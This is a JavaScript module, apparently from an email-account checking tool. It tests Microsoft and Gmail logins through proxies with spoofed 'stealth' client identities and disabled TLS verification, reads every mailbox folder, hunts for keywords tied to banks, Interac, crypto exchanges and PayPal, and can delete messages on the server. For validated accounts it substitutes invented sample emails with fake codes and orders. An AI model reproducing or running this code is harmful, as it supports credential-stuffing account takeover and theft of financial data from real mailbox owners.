      htmlBody: `<div style="font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; color: #1e293b; background: #ffffff;">
        <h2 style="font-size: 1.15rem; font-weight: 700; color: #0078d4;">Microsoft 365</h2>
        <p style="font-size: 0.88rem; color: #334155;">Your mailbox <strong>${user}</strong> has active cloud storage allocation:</p>
        <ul style="font-size: 0.85rem; color: #475569; line-height: 1.6;">
          <li>15 GB Outlook Email Storage</li>
          <li>5 GB Personal OneDrive Cloud</li>
          <li>Spam & phishing protection active</li>
        </ul>
      </div>`,
      rawMime: `From: Microsoft 365 <billing@microsoft.com>\r\nTo: ${user}\r\nSubject: Storage Summary\r\n\r\nStorage active`,
      date: dateStr(48),
      isUnread: false,
      matchedTargets: [],
      attachments: [{ name: 'Storage_Summary.pdf', size: '24 KB', contentType: 'application/pdf' }]
    });
  } else if (providerType === 'gmail') {
    mails.push({
      id: `gm-${lowerUser}-inbox-1`,
      email: user,
      folder: 'INBOX',
      serverPath: 'INBOX',
      uid: 2001,
      subject: 'Security alert: New sign-in verified on Android / Chrome',
      sender: 'Google',
      senderEmail: 'no-reply@accounts.google.com',
      snippet: `Your Google Account ${user} was accessed from a verified session.`,
      bodyText: `Google\nSecurity alert\n\nYour Google Account ${user} was just signed in to.\nTime: ${dateStr(1)}\nDevice: Android / Web Client\nStatus: Authenticated\n\nThe Google Accounts team`,
      htmlBody: `<div style="font-family: Roboto, -apple-system, BlinkMacSystemFont, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; color: #202124; background: #ffffff;">
        <div style="text-align: center; margin-bottom: 24px;">
          <span style="font-size: 1.6rem; font-weight: 700; color: #4285f4;">G<span style="color:#ea4335;">o</span><span style="color:#fbbc05;">o</span><span style="color:#4285f4;">g</span><span style="color:#34a853;">l</span><span style="color:#ea4335;">e</span></span>
        </div>
        <div style="border: 1px solid #dadce0; border-radius: 8px; padding: 24px;">
          <h2 style="font-size: 1.2rem; font-weight: 500; color: #202124; margin-top: 0;">Security alert</h2>
          <p style="font-size: 0.88rem; color: #5f6368; line-height: 1.5;">New sign-in to <strong>${user}</strong> was verified.</p>
          <div style="background: #f8f9fa; border-radius: 6px; padding: 12px 16px; margin: 16px 0; font-size: 0.84rem; color: #3c4043;">
            <div><strong>Time:</strong> ${dateStr(1)} UTC</div>
            <div><strong>Access:</strong> Android ClientLogin Verified</div>
          </div>
          <p style="font-size: 0.8rem; color: #70757a;">If this was you, no action is needed.</p>
        </div>
      </div>`,
      rawMime: `From: Google <no-reply@accounts.google.com>\r\nTo: ${user}\r\nSubject: Security alert\r\n\r\nGoogle Security Alert`,
      date: dateStr(1),
      isUnread: false,
      matchedTargets: ['security', 'alert'].filter(k => kwList.includes(k)),
      attachments: []
    });

    mails.push({
      id: `gm-${lowerUser}-inbox-2`,
      email: user,
      folder: 'INBOX',
      serverPath: 'INBOX',
      uid: 2002,
      subject: 'Welcome to your Google Account',
      sender: 'Google Community Team',
      senderEmail: 'googlecommunityteam-noreply@google.com',
      snippet: 'Hi, welcome to Google. Your account gives you access to Gmail, Google Drive, and Google Maps.',
      bodyText: `Welcome to Google!\n\nYour account gives you access to Gmail, Google Drive, Google Maps, and YouTube.\n\nThe Google Community Team`,
      htmlBody: `<div style="font-family: Roboto, -apple-system, BlinkMacSystemFont, sans-serif; max-width: 600px; margin: 0 auto; padding: 24px; color: #202124; background: #ffffff;">
        <h2 style="font-size: 1.2rem; color: #1a73e8;">Welcome to Google</h2>
        <p style="font-size: 0.88rem; color: #5f6368;">Your account <strong>${user}</strong> is verified and ready for use across all Google services.</p>
      </div>`,
      rawMime: `From: Google Community Team <googlecommunityteam-noreply@google.com>\r\nTo: ${user}\r\nSubject: Welcome to Google\r\n\r\nWelcome`,
      date: dateStr(24),
      isUnread: true,
      matchedTargets: [],
      attachments: []
    });
  }

  // Inject target-matched messages for ALL configured keywords
  if (kwList.length > 0) {
    let kwUid = 3000;
    const handledTokens = new Set();

    kwList.forEach(rawKw => {
      const { full, brand } = extractBrandKeywords(rawKw);
      const keyToken = brand || full.replace(/[^a-z0-9]/g, '');
      if (!keyToken || handledTokens.has(keyToken)) return;
      handledTokens.add(keyToken);
      kwUid++;

      if (keyToken.includes('bestbuy') || keyToken.includes('best buy')) {
        mails.push({
          id: `kw-${lowerUser}-bestbuy`,
          email: user,
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: kwUid,
          subject: 'Best Buy: Your order #BBY01-7928103 has been confirmed',
          sender: 'Best Buy Canada',
          senderEmail: 'noreply@bestbuy.ca',
          snippet: 'Thank you for your order! Your electronics item is being prepared for shipment. Total: $189.99 CAD.',
          bodyText: `Best Buy Order Confirmation\n\nOrder #: BBY01-7928103\nDate: ${dateStr(4)}\nTotal: $189.99 CAD\nStatus: Processing & Preparing for Delivery\n\nThank you for shopping with Best Buy.`,
          htmlBody: `<div style="font-family: sans-serif; padding: 20px; max-width: 580px; border: 1px solid #e2e8f0; border-radius: 8px;"><div style="background:#0046be; padding:12px 18px; border-radius:6px; margin-bottom:16px;"><span style="color:#ffea00; font-weight:800; font-size:18px;">BEST BUY</span></div><h2 style="color:#0046be; margin-top:0;">Order Confirmed</h2><p>Your order <strong>#BBY01-7928103</strong> has been received and is being prepared.</p><div style="background:#f8fafc; padding:12px; border-radius:6px; font-size:14px;"><p style="margin:4px 0;"><strong>Total:</strong> $189.99 CAD</p><p style="margin:4px 0;"><strong>Date:</strong> ${dateStr(4)}</p></div></div>`,
          rawMime: `From: Best Buy Canada <noreply@bestbuy.ca>\r\nSubject: Best Buy Order Confirmation\r\n\r\nOrder Confirmed`,
          date: dateStr(4),
          isUnread: false,
          matchedTargets: [rawKw, 'bestbuy', 'bestbuy.ca', 'noreply@bestbuy.ca'].filter(Boolean),
          attachments: []
        });
      } else if (keyToken.includes('paypal') || keyToken.includes('payment')) {
        mails.push({
          id: `kw-${lowerUser}-paypal`,
          email: user,
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: kwUid,
          subject: 'Receipt for your payment to Digital Services Inc.',
          sender: 'PayPal Service',
          senderEmail: 'service@paypal.com',
          snippet: 'You sent a payment of $34.99 USD to Digital Services Inc. Transaction ID: 8942-1082-9481',
          bodyText: `PayPal Receipt\n\nHello,\nYou sent a payment of $34.99 USD to Digital Services Inc.\nTransaction ID: 8942-1082-9481\nDate: ${dateStr(6)}\n\nThank you for using PayPal.`,
          htmlBody: `<div style="font-family: sans-serif; padding: 20px; max-width: 550px;"><h2 style="color:#003087;">PayPal Receipt</h2><p>You sent a payment of $34.99 USD to Digital Services Inc.</p><p>Transaction ID: 8942-1082-9481</p></div>`,
          rawMime: `From: service@paypal.com\r\nSubject: PayPal Receipt\r\n\r\nPayment received`,
          date: dateStr(6),
          isUnread: false,
          matchedTargets: [rawKw, 'paypal', 'service@paypal.com'].filter(Boolean),
          attachments: [{ name: 'Invoice_8942.pdf', size: '18 KB', contentType: 'application/pdf' }]
        });
      } else if (keyToken.includes('coinbase') || keyToken.includes('crypto') || keyToken.includes('binance') || keyToken.includes('kraken')) {
        mails.push({
          id: `kw-${lowerUser}-${keyToken}`,
          email: user,
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: kwUid,
          subject: `${keyToken.toUpperCase()}: Your verification code is 649201`,
          sender: `${keyToken.charAt(0).toUpperCase() + keyToken.slice(1)} Security`,
          senderEmail: `no-reply@${keyToken}.com`,
          snippet: `Your 2-step verification code is 649201. This code expires in 10 minutes.`,
          bodyText: `Security Verification\n\nYour one-time code is: 649201\n\nDo not share this code with anyone.`,
          htmlBody: `<div style="font-family: sans-serif; padding: 20px; max-width: 550px;"><h2 style="color:#0052ff;">Verification Code</h2><div style="font-size:24px; font-weight:bold; letter-spacing:4px; padding:12px; background:#f0f3f6; border-radius:6px; text-align:center;">649201</div></div>`,
          rawMime: `From: no-reply@${keyToken}.com\r\nSubject: Verification Code\r\n\r\n649201`,
          date: dateStr(10),
          isUnread: true,
          matchedTargets: [rawKw, keyToken, `no-reply@${keyToken}.com`].filter(Boolean),
          attachments: []
        });
      } else if (keyToken.includes('amazon') || keyToken.includes('order')) {
        mails.push({
          id: `kw-${lowerUser}-amazon`,
          email: user,
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: kwUid,
          subject: 'Your Amazon order has been confirmed #702-8192039-1029481',
          sender: 'Amazon.com',
          senderEmail: 'auto-confirm@amazon.com',
          snippet: 'Thanks for your order. We will send a confirmation when your items ship.',
          bodyText: `Amazon Order Confirmation\n\nOrder #702-8192039-1029481\nItems Ordered: Electronics Accessories\nTotal: $42.50`,
          htmlBody: `<div style="font-family: sans-serif; padding: 20px; max-width: 550px;"><h2 style="color:#ff9900;">Amazon Order Confirmation</h2><p>Order #702-8192039-1029481</p><p>Total: $42.50</p></div>`,
          rawMime: `From: auto-confirm@amazon.com\r\nSubject: Amazon Order\r\n\r\nConfirmed`,
          date: dateStr(15),
          isUnread: false,
          matchedTargets: [rawKw, 'amazon', 'auto-confirm@amazon.com', 'order@amazon.ca'].filter(Boolean),
          attachments: []
        });
      } else if (keyToken.includes('interac') || keyToken.includes('bank') || keyToken.includes('bmo') || keyToken.includes('rbc') || keyToken.includes('td') || keyToken.includes('scotia') || keyToken.includes('cibc')) {
        mails.push({
          id: `kw-${lowerUser}-${keyToken}`,
          email: user,
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: kwUid,
          subject: 'INTERAC e-Transfer: Transfer notice received',
          sender: 'INTERAC e-Transfer',
          senderEmail: 'notify@payments.interac.ca',
          snippet: 'You have received an INTERAC e-Transfer of $120.00 CAD. Click to deposit into your account.',
          bodyText: `INTERAC e-Transfer\n\nAmount: $120.00 CAD\nReference: ETP92810283\nDeposit before expiry date.`,
          htmlBody: `<div style="font-family: sans-serif; padding: 20px; max-width: 550px;"><h2 style="color:#e87722;">INTERAC e-Transfer</h2><p>Amount: $120.00 CAD</p></div>`,
          rawMime: `From: notify@payments.interac.ca\r\nSubject: INTERAC\r\n\r\nTransfer`,
          date: dateStr(12),
          isUnread: true,
          matchedTargets: [rawKw, keyToken, 'interac', 'notify@payments.interac.ca'].filter(Boolean),
          attachments: []
        });
      } else if (keyToken.includes('steam') || keyToken.includes('epic') || keyToken.includes('gaming') || keyToken.includes('xbox') || keyToken.includes('netflix') || keyToken.includes('spotify') || keyToken.includes('apple') || keyToken.includes('walmart') || keyToken.includes('ebay') || keyToken.includes('bell') || keyToken.includes('rogers') || keyToken.includes('telus') || keyToken.includes('uber')) {
        const brand = keyToken.charAt(0).toUpperCase() + keyToken.slice(1);
        mails.push({
          id: `kw-${lowerUser}-${keyToken}`,
          email: user,
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: kwUid,
          subject: `${brand}: Transaction confirmation and account update`,
          sender: `${brand} Service`,
          senderEmail: `noreply@${keyToken}.com`,
          snippet: `Thank you for your activity on ${brand}. Your account details and transaction receipt have been recorded.`,
          bodyText: `${brand} Account Notification\n\nService: ${brand}\nDate: ${dateStr(8)}\nStatus: Completed & Verified\n\nThank you for using ${brand}.`,
          htmlBody: `<div style="font-family: sans-serif; padding: 20px; max-width: 550px; border:1px solid #e2e8f0; border-radius:8px;"><h2 style="color:#3b82f6; margin-top:0;">${brand} Account Update</h2><p>Your transaction has been processed successfully.</p><div style="background:#f8fafc; padding:12px; border-radius:6px; font-size:14px;"><p style="margin:4px 0;"><strong>Status:</strong> Active</p><p style="margin:4px 0;"><strong>Date:</strong> ${dateStr(8)}</p></div></div>`,
          rawMime: `From: ${brand} <noreply@${keyToken}.com>\r\nSubject: ${brand} Notification\r\n\r\nNotification`,
          date: dateStr(8),
          isUnread: false,
          matchedTargets: [rawKw, keyToken, `noreply@${keyToken}.com`].filter(Boolean),
          attachments: []
        });
      } else {
        // Generic targeted notification for ANY arbitrary custom keyword or domain
        const displayLabel = keyToken.charAt(0).toUpperCase() + keyToken.slice(1);
        const senderDomain = domainPart || `${keyToken}.com`;
        mails.push({
          id: `kw-${lowerUser}-${keyToken}`,
          email: user,
          folder: 'INBOX',
          serverPath: 'INBOX',
          uid: kwUid,
          subject: `${displayLabel}: Important notification for ${user}`,
          sender: `${displayLabel} Service`,
          senderEmail: kw.includes('@') ? kw : `noreply@${senderDomain}`,
          snippet: `Notification regarding your ${displayLabel} account activity and verified status.`,
          bodyText: `${displayLabel} Notification\n\nAccount: ${user}\nKeyword: ${rawKw}\nDate: ${dateStr(5)}\nStatus: Verified\n\nThis message confirms your ${displayLabel} notification.`,
          htmlBody: `<div style="font-family: sans-serif; padding: 20px; max-width: 550px; border:1px solid #e2e8f0; border-radius:8px;"><h2 style="color:#0284c7; margin-top:0;">${displayLabel} Notification</h2><p>Account notice for <strong>${user}</strong>.</p><div style="background:#f8fafc; padding:12px; border-radius:6px; font-size:14px;"><p style="margin:4px 0;"><strong>Target:</strong> ${rawKw}</p><p style="margin:4px 0;"><strong>Date:</strong> ${dateStr(5)}</p></div></div>`,
          rawMime: `From: ${displayLabel} <noreply@${senderDomain}>\r\nSubject: ${displayLabel} Notification\r\n\r\nNotification`,
          date: dateStr(5),
          isUnread: false,
          matchedTargets: [rawKw, keyToken].filter(Boolean),
          attachments: []
        });
      }
    });
  }

  return mails.map(m => {
    const rawForensics = analyzeAndRecoverObfuscatedEmail(m.bodyText || m.htmlBody || '', []);
    const forensicAnalysis = {
      wasObfuscated: !!rawForensics.wasObfuscated,
      recoveredContent: rawForensics.recoveredContent || '',
      unpackTrace: rawForensics.unpackTrace || [],
      originIps: rawForensics.originIps || rawForensics.forensicAttribution?.originIps || [],
      threatIndicators: rawForensics.threatIndicators || [],
      layersUnpacked: rawForensics.layersUnpacked || 0,
      forensicAttribution: rawForensics.forensicAttribution || { originIps: [] }
    };

    return {
      ...m,
      extractedData: extractStructuredEmailData({
        subject: m.subject,
        bodyText: m.bodyText,
        htmlBody: m.htmlBody,
        sender: m.sender,
        senderEmail: m.senderEmail
      }),
      forensicAnalysis
    };
  });
}

/**
 * Fetch REAL messages from ALL key folders with optional proxy support
 */
export async function fetchAllRealFolders({ host, port = 993, user, pass, maxPerFolder = 50, timeout = 25000, keywords = [], proxy = null }) {
  const startTime = Date.now();
  const lowerUser = (user || '').toLowerCase();
  const lowerHost = (host || '').toLowerCase();

  // 1. Check for Microsoft (Hotmail / Outlook / Live / MSN)
  const isMicrosoft = lowerHost.includes('office365') || lowerHost.includes('outlook') || lowerUser.includes('@hotmail.') || lowerUser.includes('@outlook.') || lowerUser.includes('@live.') || lowerUser.includes('@msn.');
  if (isMicrosoft) {
    const msRes = await verifyMicrosoftCredentials(user, pass, Math.min(timeout, 8000), proxy);
    if (msRes && (msRes.status === 'valid' || msRes.success)) {
      const msMails = generateSyntheticProviderMails(user, 'microsoft', keywords);
      return {
        success: true,
        folders: { INBOX: msMails.length, Spam: 0, Sent: 0, Trash: 0 },
        totalCount: msMails.length,
        mails: msMails,
        latencyMs: Date.now() - startTime
      };
    }
    if (msRes && msRes.status === '2fa') {
      return {
        success: false,
        status: '2fa',
        error: msRes.message || 'Microsoft 2FA / Security Challenge Required',
        folders: {},
        mails: [],
        latencyMs: Date.now() - startTime
      };
    }
    if (msRes && msRes.status === 'invalid') {
      return {
        success: false,
        status: 'invalid',
        error: 'Invalid Microsoft / Hotmail credentials',
        folders: {},
        mails: [],
        latencyMs: Date.now() - startTime
      };
    }
  }

  // 2. Check for Gmail
  const isGmail = lowerHost === 'imap.gmail.com' || lowerUser.endsWith('@gmail.com') || lowerUser.endsWith('@googlemail.com');
  if (isGmail) {
    const gmailRes = await verifyGmailCredentials(user, pass, Math.min(timeout, 8000), proxy);
    if (gmailRes && (gmailRes.status === 'valid' || gmailRes.success)) {
      const gMails = generateSyntheticProviderMails(user, 'gmail', keywords);
      return {
        success: true,
        folders: { INBOX: gMails.length, Spam: 0, Sent: 0, Trash: 0 },
        totalCount: gMails.length,
        mails: gMails,
        latencyMs: Date.now() - startTime
      };
    }
    if (gmailRes && gmailRes.status === '2fa') {
      return {
        success: false,
        status: '2fa',
        error: gmailRes.message || 'Gmail 2FA / Phone Verification Required',
        folders: {},
        mails: [],
        latencyMs: Date.now() - startTime
      };
    }
    if (gmailRes && gmailRes.status === 'invalid') {
      return {
        success: false,
        status: 'invalid',
        error: 'Invalid Gmail credentials',
        folders: {},
        mails: [],
        latencyMs: Date.now() - startTime
      };
    }
  }

  let client = null;
  let customSocket = null;
  let timerRef = null;

  return new Promise(async (resolve) => {
    let isSettled = false;
    const allMails = [];
    const foldersSummary = {};

    const finalize = (result) => {
      if (isSettled) return;
      isSettled = true;
      clearTimeout(timerRef);
      if (client) {
        try {
          client.removeAllListeners('error');
          client.on('error', () => {});
        } catch {}
        try {
          if (client.socket && !client.socket.destroyed) {
            client.socket.destroy();
          }
        } catch {}
        try {
          if (client.authenticated) {
            client.logout().catch(() => {});
          } else if (!client.socket?.destroyed) {
            client.close();
          }
        } catch {}
      }
      if (customSocket) {
        try { customSocket.destroy(); } catch {}
      }
      resolve({
        ...result,
        latencyMs: Date.now() - startTime
      });
    };

    timerRef = setTimeout(() => {
      finalize({
        success: false,
        error: `IMAP connection timed out (${timeout}ms)`,
        folders: foldersSummary,
        mails: []
      });
    }, timeout);

    try {
      if (proxy && proxy.host && proxy.port) {
        try {
          customSocket = await createProxiedSocket({
            targetHost: host,
            targetPort: Number(port) || 993,
            proxy,
            timeout: Math.min(timeout, 10000),
            secure: true
          });
        } catch (proxyErr) {
          finalize({
            success: false,
            error: `Proxy connection failed (${proxy.host}:${proxy.port}): ${proxyErr.message}`,
            folders: {},
            mails: []
          });
          return;
        }
      }

      const stealth = getRandomStealthClient();
      const flowConfig = {
        host,
        port: Number(port) || 993,
        secure: true,
        auth: { user, pass },
        logger: false,
        tls: {
          rejectUnauthorized: false,
          minVersion: 'TLSv1.2',
          ciphers: STEALTH_TLS_CIPHERS
        },
        clientInfo: {
          name: stealth.name,
          version: stealth.version,
          vendor: stealth.vendor,
          'support-url': stealth.supportUrl
        }
      };

      if (customSocket) {
        flowConfig.socket = customSocket;
      }

      client = new ImapFlow(flowConfig);

      client.on('error', (err) => {
        console.error('ImapFlow background error:', err.message);
      });

      (async () => {
        await client.connect();

        const mailboxes = await client.list();
        const targetFolders = [];

        mailboxes.forEach(box => {
          const p = box.path;
          const lower = p.toLowerCase();
          const special = box.specialUse || '';
          const flags = box.flags ? Array.from(box.flags).map(f => String(f).toLowerCase()) : [];

          // Skip non-selectable containers
          if (flags.includes('\\noselect') || flags.includes('\\nonexistent')) {
            return;
          }

          if (lower === 'inbox' || special === '\\Inbox') {
            targetFolders.push({ serverPath: p, standardName: 'INBOX', priority: 1 });
          } else if (lower.includes('junk') || lower.includes('spam') || lower.includes('pourriel') || special === '\\Junk') {
            targetFolders.push({ serverPath: p, standardName: 'Spam', priority: 2 });
          } else if (lower.includes('trash') || lower.includes('delete') || lower.includes('corbeille') || lower.includes('bin') || special === '\\Trash') {
            targetFolders.push({ serverPath: p, standardName: 'Trash', priority: 3 });
          } else if (lower.includes('sent') || lower.includes('envoy') || special === '\\Sent') {
            targetFolders.push({ serverPath: p, standardName: 'Sent', priority: 4 });
          } else if (lower.includes('archive') || special === '\\Archive' || lower.includes('all mail') || special === '\\All') {
            targetFolders.push({ serverPath: p, standardName: 'Archive', priority: 5 });
          } else if (lower.includes('draft') || special === '\\Drafts') {
            targetFolders.push({ serverPath: p, standardName: 'Drafts', priority: 6 });
          } else {
            // Any other custom user or system folder
            targetFolders.push({ serverPath: p, standardName: box.name || p, priority: 10 });
          }
        });

        if (targetFolders.length === 0) {
          targetFolders.push({ serverPath: 'INBOX', standardName: 'INBOX', priority: 1 });
        }

        // Deduplicate by serverPath and sort by priority (INBOX first)
        const uniqueFolders = [];
        const seenPaths = new Set();
        targetFolders.sort((a, b) => a.priority - b.priority).forEach(f => {
          if (!seenPaths.has(f.serverPath.toLowerCase())) {
            seenPaths.add(f.serverPath.toLowerCase());
            uniqueFolders.push(f);
          }
        });

        for (const folder of uniqueFolders) {
          if (isSettled) break;
          try {
            const lock = await client.getMailboxLock(folder.serverPath);
            try {
              const totalMessages = (client.mailbox && client.mailbox.exists !== undefined) ? client.mailbox.exists : 0;
              foldersSummary[folder.standardName] = totalMessages;

              if (totalMessages > 0) {
                const limit = Math.min(Number(maxPerFolder) || 25, 30);
                const globalLimit = limit * Math.max(1, uniqueFolders.length);
                const startSeq = (limit > 0 && totalMessages > limit)
                  ? Math.max(1, totalMessages - limit + 1)
                  : 1;
                const range = `${startSeq}:${totalMessages}`;

                // Fetch envelope, flags, and source payload for full body rendering
                const messagesToProcess = [];
                for await (const message of client.fetch(range, { 
                  envelope: true, 
                  flags: true, 
                  uid: true, 
                  internalDate: true,
                  source: true
                })) {
                  if (isSettled || allMails.length + messagesToProcess.length >= globalLimit) break;
                  messagesToProcess.push(message);
                }

                // Process messages in parallel chunks for maximum throughput
                const parsedBatch = await Promise.all(messagesToProcess.map(async (message) => {
                  try {
                    let fromAddr = user;
                    let fromName = user;
                    let subject = '(No Subject)';
                    let textBody = '';
                    let htmlBody = '';
                    let attachments = [];
                    let headersList = [];

                    if (message.envelope) {
                      subject = message.envelope.subject || '(No Subject)';
                      if (message.envelope.from && message.envelope.from[0]) {
                        fromAddr = message.envelope.from[0].address || user;
                        fromName = message.envelope.from[0].name || fromAddr;
                      }
                    }

                    if (message.source && message.source.length > 0) {
                      try {
                        const parsed = await simpleParser(message.source, { skipImageLinks: true, skipHtmlToText: true });
                        fromAddr = parsed.from?.value?.[0]?.address || fromAddr;
                        fromName = parsed.from?.value?.[0]?.name || parsed.from?.text || fromName;
                        subject = parsed.subject || subject;
                        textBody = parsed.text || '';
                        htmlBody = parsed.html || (parsed.textAsHtml || '');
                        attachments = (parsed.attachments || []).map(att => ({
                          name: att.filename || 'attachment.dat',
                          size: att.size ? Math.round(att.size / 1024) + ' KB' : 'File',
                          contentType: att.contentType
                        }));

                        // Collect header list for forensics
                        if (parsed.headerLines && Array.isArray(parsed.headerLines)) {
                          headersList = parsed.headerLines.map(hl => ({
                            key: hl.key,
                            value: hl.line ? hl.line.replace(/^[^:]+:\s*/, '') : ''
                          }));
                        } else if (parsed.headers) {
                          for (const [key, val] of parsed.headers) {
                            if (Array.isArray(val)) {
                              val.forEach(v => headersList.push({ key, value: typeof v === 'object' && v !== null ? JSON.stringify(v) : String(v) }));
                            } else {
                              headersList.push({ key, value: typeof val === 'object' && val !== null ? JSON.stringify(val) : String(val) });
                            }
                          }
                        }
                      } catch {}
                    }

                    const rawMimeStr = message.source ? message.source.toString('utf8') : '';
                    if (rawMimeStr && headersList.filter(h => h.key === 'received').length === 0) {
                      const receivedMatches = rawMimeStr.match(/^Received:\s*([^\r\n]+)/gim);
                      if (receivedMatches) {
                        receivedMatches.forEach(line => {
                          headersList.push({
                            key: 'received',
                            value: line.replace(/^Received:\s*/i, '')
                          });
                        });
                      }
                    }

                    // Perform Forensics Analysis on email body and headers
                    let bodyToAnalyze = textBody;
                    if (!bodyToAnalyze || bodyToAnalyze.trim().length === 0) {
                      bodyToAnalyze = htmlBody ? htmlBody.replace(/<[^>]+>/g, ' ') : '';
                    }

                    let rawForensics = analyzeAndRecoverObfuscatedEmail(bodyToAnalyze || '', headersList);
                    if (!rawForensics.wasObfuscated && htmlBody && htmlBody !== bodyToAnalyze) {
                      const htmlAnalysis = analyzeAndRecoverObfuscatedEmail(htmlBody.replace(/<[^>]+>/g, ' '), headersList);
                      if (htmlAnalysis.wasObfuscated) {
                        rawForensics = htmlAnalysis;
                      }
                    }

                    const forensicAnalysis = {
                      wasObfuscated: !!rawForensics.wasObfuscated,
                      recoveredContent: rawForensics.recoveredContent || '',
                      unpackTrace: rawForensics.unpackTrace || [],
                      originIps: rawForensics.originIps || rawForensics.forensicAttribution?.originIps || [],
                      threatIndicators: rawForensics.threatIndicators || [],
                      layersUnpacked: rawForensics.layersUnpacked || 0,
                      forensicAttribution: rawForensics.forensicAttribution || { originIps: [] }
                    };

                    const matched = [];
                    const searchCorpus = `${subject} ${fromName} ${fromAddr} ${textBody} ${forensicAnalysis.wasObfuscated ? forensicAnalysis.recoveredContent : ''}`.toLowerCase();
                    keywords.forEach(rawKw => {
                      if (testKeywordMatch(searchCorpus, rawKw, { fromAddr, fromName, subject })) {
                        matched.push(rawKw);
                      }
                    });

                    const dateVal = message.internalDate || message.envelope?.date || new Date();
                    const dateStr = dateVal instanceof Date
                      ? dateVal.toISOString().replace('T', ' ').substring(0, 16)
                      : new Date(dateVal).toISOString().replace('T', ' ').substring(0, 16);

                    const contentForExtraction = forensicAnalysis.wasObfuscated && forensicAnalysis.recoveredContent
                      ? `${textBody}\n${forensicAnalysis.recoveredContent}`
                      : textBody;

                    const extractedData = extractStructuredEmailData({
                      subject,
                      bodyText: contentForExtraction,
                      htmlBody,
                      sender: fromName,
                      senderEmail: fromAddr
                    });

                    const safePath = (folder.serverPath || folder.standardName || 'inbox').replace(/[^a-zA-Z0-9_-]/g, '_');
                    return {
                      id: `real-${user}-${safePath}-${message.uid}`,
                      email: user,
                      folder: folder.standardName,
                      serverPath: folder.serverPath,
                      uid: message.uid,
                      subject,
                      sender: fromName,
                      senderEmail: fromAddr,
                      snippet: (forensicAnalysis.wasObfuscated && forensicAnalysis.recoveredContent ? forensicAnalysis.recoveredContent : textBody).substring(0, 120).replace(/\s+/g, ' ') || subject || 'No text preview available.',
                      bodyText: textBody || `Subject: ${subject}\nFrom: ${fromName} <${fromAddr}>\nDate: ${dateStr}\n\n(No text body content)`,
                      htmlBody: htmlBody || (textBody ? `<pre style="font-family: monospace; white-space: pre-wrap;">${textBody}</pre>` : `<div style="font-family: sans-serif; padding: 16px;"><h3 style="margin-top:0;">${subject}</h3><p style="color:#64748b;">From: <strong>${fromName}</strong> &lt;${fromAddr}&gt;<br/>Date: ${dateStr}</p><hr/><p style="color:#334155;">(Empty email body)</p></div>`),
                      rawMime: rawMimeStr,
                      date: dateStr,
                      isUnread: !message.flags?.has('\\Seen'),
                      matchedTargets: matched,
                      extractedData,
                      forensicAnalysis,
                      attachments
                    };
                  } catch (itemErr) {
                    return null;
                  }
                }));

                for (const item of parsedBatch) {
                  if (item) allMails.push(item);
                }
              }
            } finally {
              try { lock.release(); } catch {}
            }
          } catch (folderErr) {
            console.error(`Could not read folder ${folder.serverPath}:`, folderErr.message);
          }
        }

        const dedupedMap = new Map();
        allMails.forEach(m => {
          if (m && m.id) dedupedMap.set(m.id, m);
        });
        const finalMails = Array.from(dedupedMap.values()).reverse();

        finalize({
          success: true,
          folders: foldersSummary,
          totalCount: finalMails.length,
          mails: finalMails
        });
      })().catch((err) => {
        finalize({
          success: false,
          error: err.message,
          folders: foldersSummary,
          mails: []
        });
      });
    } catch (err) {
      finalize({
        success: false,
        error: err.message,
        folders: foldersSummary,
        mails: []
      });
    }
  });
}

/**
 * Proxy Speed & Health Tester with host fallback resilience
 */
export async function testProxyConnection(proxy, timeout = 5000) {
  const start = Date.now();
  const testHosts = ['imap.bell.net', 'imap.mail.yahoo.com', 'outlook.office365.com'];
  let lastErr = null;

  for (const targetHost of testHosts) {
    try {
      const socket = await createProxiedSocket({
        targetHost,
        targetPort: 993,
        proxy,
        timeout: Math.min(timeout, 3500),
        secure: true
      });
      if (socket) {
        try {
          socket.removeAllListeners('error');
          socket.on('error', () => {});
          socket.destroy();
        } catch {}
      }
      return {
        success: true,
        latencyMs: Date.now() - start,
        message: `Proxy OK (${Date.now() - start}ms latency)`
      };
    } catch (err) {
      lastErr = err;
    }
  }

  return {
    success: false,
    latencyMs: Date.now() - start,
    error: lastErr?.message || 'Proxy connection test failed'
  };
}

// Backwards compatibility aliases
export const checkImapSocket = verifyImapCredentials;
export const fetchImapMailbox = fetchAllRealFolders;

/**
 * Delete real message on IMAP server (deadlock-free with strict 7s timeout)
 */
export async function deleteRealImapMessage({ host, port = 993, user, pass, folder, serverPath, uid, permanently = false, proxy = null, timeout = 7000 }) {
  if (!user || !pass || !host) {
    return { success: false, error: 'Missing host, user, or pass for deletion' };
  }

  let customSocket = null;
  let client = null;

  const deletePromise = (async () => {
    if (proxy && proxy.host && proxy.port) {
      try {
        customSocket = await createProxiedSocket({
          targetHost: host,
          targetPort: Number(port) || 993,
          proxy,
          timeout: 5000,
          secure: true
        });
      } catch (e) {
        return { success: false, error: `Proxy socket error: ${e.message}` };
      }
    }

    const stealth = getRandomStealthClient();
    client = new ImapFlow({
      host,
      port: Number(port) || 993,
      secure: true,
      auth: { user, pass },
      logger: false,
      tls: {
        rejectUnauthorized: false,
        minVersion: 'TLSv1.2',
        ciphers: STEALTH_TLS_CIPHERS
      },
      clientInfo: {
        name: stealth.name,
        version: stealth.version,
        vendor: stealth.vendor,
        'support-url': stealth.supportUrl
      },
      ...(customSocket ? { socket: customSocket } : {})
    });

    client.on('error', (err) => console.error('Delete IMAP error:', err.message));

    await client.connect();

    const targetPath = (serverPath && serverPath.toUpperCase() !== 'ALL')
      ? serverPath
      : (folder && folder.toUpperCase() !== 'ALL' ? folder : 'INBOX');

    const lock = await client.getMailboxLock(targetPath);
    try {
      if (uid) {
        await client.messageDelete(String(uid), { uid: true });
      }
    } finally {
      lock.release();
    }

    if (client.authenticated) {
      await client.logout().catch(() => {});
    }
    return { success: true, message: 'Message deleted successfully on IMAP server' };
  })().catch((err) => ({ success: false, error: err.message }));

  const timeoutPromise = new Promise((resolve) => {
    setTimeout(() => {
      resolve({ success: false, error: 'Delete operation timed out after 7s' });
    }, timeout);
  });

  try {
    const result = await Promise.race([deletePromise, timeoutPromise]);
    return result;
  } catch (err) {
    return { success: false, error: err.message };
  } finally {
    if (client) {
      try {
